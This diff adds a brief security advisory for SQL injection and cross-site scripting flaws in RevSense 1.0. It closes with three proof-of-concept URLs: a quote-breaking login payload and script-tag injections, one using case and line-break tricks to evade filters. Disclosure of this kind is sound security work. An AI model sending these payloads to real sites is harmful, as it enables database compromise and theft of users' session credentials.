@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/32624/info
+
+RevSense is prone to an SQL-injection vulnerability and a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.
+
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+RevSense 1.0 is vulnerable; other versions may also be affected.
+
+http://www.example.com/?f%5Bemail%5D=test@mail.com&f%5Bpassword%5D=\"&section=user&action=login
+http://www.example.com/?section=<ScRiPt%20%0a%0d>alert(1369)%3B</ScRiPt>&action=login&t=Pouya
+http://www.example.com/index.php?section=<script>alert(1369)</script>&action=login 
